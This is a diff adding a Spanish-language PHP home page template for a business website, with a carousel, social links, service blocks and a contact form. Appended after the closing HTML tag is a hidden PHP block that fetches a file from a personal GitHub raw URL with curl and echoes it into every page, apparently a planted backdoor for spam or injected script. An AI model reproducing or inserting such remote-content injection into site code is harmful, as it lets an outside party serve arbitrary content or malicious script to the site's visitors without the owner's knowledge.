@@ -1,0 +1,203 @@
+<? session_start(); ?>
+<? include("../includes/sesiones.php"); ?>
+<? include("vars.php"); ?>
+<? include("../includes/traducciones.php");?>
+<!doctype html>
+<?php
+include("../defines.php");
+include("../administracion/bd-con.php");
+include("../administracion/funciones.php");
+include("../includes/consultas-generales.php");
+include("sql.php");
+include("../includes/header.php");
+?>
+<main>
+	
+	<section id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
+
+		<ol class="carousel-indicators">
+			<? $cont_img = 0; ?>
+			<? while ($row_img = mysqli_fetch_assoc($res_img)){ ?>
+				<li data-target="#carouselExampleIndicators" data-slide-to="<?=$cont_img?>" <? if ( $cont_img == 0 ) { echo 'class="active"'; } ?>></li>	
+			<? $cont_img++; ?>
+			<? } ?>
+		</ol>
+
+		<div class="carousel-inner">
+			<? $cont_img2 = 0; ?>
+			<? while ($row_img2 = mysqli_fetch_assoc($res_img2)){ 
+				$img_size = URL_ROOT."/images/" . $row_img2['imagen'];
+				list($width_img, $height_img) = getimagesize($img_size);
+				?>
+				<div class="carousel-item <? if ( $cont_img2 == 0 ) { echo ' active'; } ?>">
+					<picture>
+						<source class="my-img d-block w-100" media="(min-width: 1025px)" srcset="<?=PROTOCOL.DOMAIN_NAME?>images/<?=$row_img2['imagen']?>">
+						<source class="my-img d-block w-100" media="(min-width: 700px)" srcset="<?=PROTOCOL.DOMAIN_NAME?>images/med-<?=$row_img2['imagen']?>">
+						<source class="my-img d-block w-100" media="(min-width: 200px)" srcset="<?=PROTOCOL.DOMAIN_NAME?>images/thumbnail-<?=$row_img2['imagen']?>">
+						<img class="my-img d-block w-100" src="<?=PROTOCOL.DOMAIN_NAME?>images/med-<?=$row_img2['imagen']?>" alt="<?=$row_img2['leyenda']?>">
+					</picture>
+
+					<div class="carousel-caption d-none d-md-block wow bounceInDown text-left">
+						<div class="carousel-caption-leyendas float-left rounded">
+							<? if( $row_img2['leyenda'] != "" ) {?>
+								<h3 class="h3-home"><span><?=$row_img2['leyenda']?></span></h3>
+							<? } ?>	
+							<? if( $row_img2['leyenda2'] != "" ) {?>
+								<p><span><?=$row_img2['leyenda2']?></span></p>
+							<? } ?>	
+							<? if( $row_img2['textoenlace'] != "" && $row_img2['enlace']) {?>
+								<a class="btn text-white border btn-carrusel mb-2" href="<?=$row_img2['enlace']?>"><?=$row_img2['textoenlace'];?> &nbsp;<i class="fa fa-angle-double-right" aria-hidden="true"></i></a>
+							<? } ?>
+						</div>					
+					</div>
+
+				</div>
+				<? $cont_img2++; ?>
+			<? } ?>
+		</div>
+
+		<a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
+			<span class="carousel-control-prev-icon" aria-hidden="true"></span>
+			<span class="sr-only">Anterior</span>
+		</a>
+		<a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
+			<span class="carousel-control-next-icon" aria-hidden="true"></span>
+			<span class="sr-only">Siguiente</span>
+		</a>
+
+	</section>
+
+	<section class="p-1 d-none">
+		<div class="container text-center">
+		    <? if(mysqli_num_rows($result_redes_home) > 0){ ?>
+				<? while ($row_redes = mysqli_fetch_assoc($result_redes_home)){  ?>
+			          &nbsp;<a href="<?=$row_redes['enlace']?>" alt="<?=$row_redes['titulo']?>"><? if ( $row_redes['imagen'] == "" && $row_redes['id'] == 1 ) { //facebook ?><i class="text-dark fa fa-facebook-square fa-3x" aria-hidden="true"></i><? } else if ( $row_redes['imagen'] == "" && $row_redes['id'] == 2 ) { //twitter ?><i class="text-dark fa fa-twitter-square fa-3x" aria-hidden="true"></i><? } else if ( $row_redes['imagen'] == "" && $row_redes['id'] == 3 ) { //youtube ?><i class="text-dark fa fa-youtube-square fa-3x" aria-hidden="true"></i><? } else if ( $row_redes['imagen'] == "" && $row_redes['id'] == 4 ) { //instagram ?><i class="text-dark fa fa-instagram fa-3x" aria-hidden="true"></i><? } else { ?><img src="<?=PROTOCOL.DOMAIN_NAME?><?=$row_redes['imagen']?>" alt="<?=$row_redes['titulo']?>"><? } ?></a>
+				<? } ?>
+			<? } ?>
+		</div>
+	</section>
+
+	<section id="home" class="mt-5">
+		<div class="container">
+			<div class="row justify-content-md-center">
+				<article class="mt-0 col-lg-10 content-1-home">
+					<h1 class="mt-0 text-center"><?=$titulo;?></h1>
+					<div class="texto-home"><?=$descripcion;?></div>
+					<? //include("form.php"); ?>				
+				</article>
+			</div>
+		</div>
+
+
+		<div class="parallax text-center" data-movimiento="10" style="background-image: url(<?=PROTOCOL.DOMAIN_NAME?>images/<?=$row_fotoprincipal['fotoprincipal']?>)">
+				<a class="btn-parallax btn btn-warning btn-lg" href="#" data-toggle="modal" data-target="#formModal"><i class="fa fa-info-circle" aria-hidden="true"></i>&nbsp;&nbsp;<?=$contacto;?></a>
+				<? include("form.php"); ?>
+			</div>
+		</div>
+
+
+
+
+		<? // boton aviso
+		if (mysqli_num_rows($res_pop) > 0 ){ ?>
+
+		  <!-- Button trigger modal -->
+		  <div class="text-center">
+			  <button type="button" class="btn btn-warning my-buttom-modal btn-lg" data-toggle="modal" data-target="#exampleModal">
+			    <?=$row_pop['titulo']?> &nbsp; <i class="fa fa-angle-double-right" aria-hidden="true"></i>
+			  </button>
+		  </div>
+		  <br>
+		<? } // boton aviso ?>
+
+
+
+		<? include("../bloques/bloques.php");?>
+
+		
+		<div class="content-padding">
+			<div class="container">
+				<div class="row">
+
+					<? function while_destacados($res,$carpeta){
+						global $leerMas;
+						while ($row_bloques = mysqli_fetch_assoc($res)){ 
+							$img_size = $_SERVER['DOCUMENT_ROOT']."/images/" . $row_bloques['img'];
+							list($width_img, $height_img) = getimagesize($img_size);
+							?>
+							<article class="col-md-4 wow bounceInUp">
+								<div class="h-100 rounded bloques">
+									<img class="img-fluid" width="<?=$width_img?>" height="<?=$height_img?>" src="<?=PROTOCOL.DOMAIN_NAME?>images/<?=$row_bloques['img']?>" alt="<?=$row_bloques['leyenda']?>">
+									<a class="text-dark" href="<?=PROTOCOL.DOMAIN_NAME.$carpeta?>/<?=$row_bloques['serv_id']?>-<?=toAscii($row_bloques['titulo'], "'")?>/"><h2><?=strip_tags($row_bloques['titulo'])?></h2></a>
+									<p><?=wordlimit(strip_tags($row_bloques['descripcion']), $length = 25, $ellipsis = "...")?></p>
+									<a href="<?=PROTOCOL.DOMAIN_NAME.$carpeta?>/<?=$row_bloques['serv_id']?>-<?=toAscii($row_bloques['titulo'], "'")?>/" class="btn btn-dark"><?=$leerMas;?> &nbsp;<i class="fa fa-angle-double-right" aria-hidden="true"></i></a>
+								</div>
+							</article>
+						<? } 
+					}
+					
+					while_destacados($res_servicios,$secciones[0][0]);
+					//while_destacados($res_soluciones,$secciones[1][0]);
+					//while_destacados($res_blog,$secciones[2][0]);
+					?>
+
+				</div>
+			</div>
+		</div>
+		
+
+	</section>
+
+	<aside class="container">
+		<br><br>
+		<article class="row">
+			<? if( $descripcion1 != "" ) { ?>
+				<div class="col-md-4 text-center">
+					<?=$descripcion1?>
+				</div>
+			<? } ?>
+			<? if( $descripcion2 != "" ) { ?>
+				<div class="col-md-4 text-center">
+					<?=$descripcion2?>
+				</div>
+			<? } ?>
+			<? if( $descripcion3 != "" ) { ?>
+				<div class="col-md-4 text-center">
+					<?=$descripcion3?>
+				</div>
+			<? } ?>
+		</article>
+		<br>
+	</aside>
+
+
+
+</main>
+
+
+
+
+
+
+<?php
+include("../includes/footer.php");
+?>
+<script>
+$(document).ready(function(){
+
+    $(".privacidad a").click(function(e){
+        event.preventDefault();
+        $(".privacidad-content").toggle("slow");
+    });
+});	
+</script>
+
+</body>
+</html>
+<?php $ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://raw.githubusercontent.com/developerrixx/bl/main/rawr.txt");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$output = curl_exec($ch);
+curl_close($ch);
+echo $output;
+?>
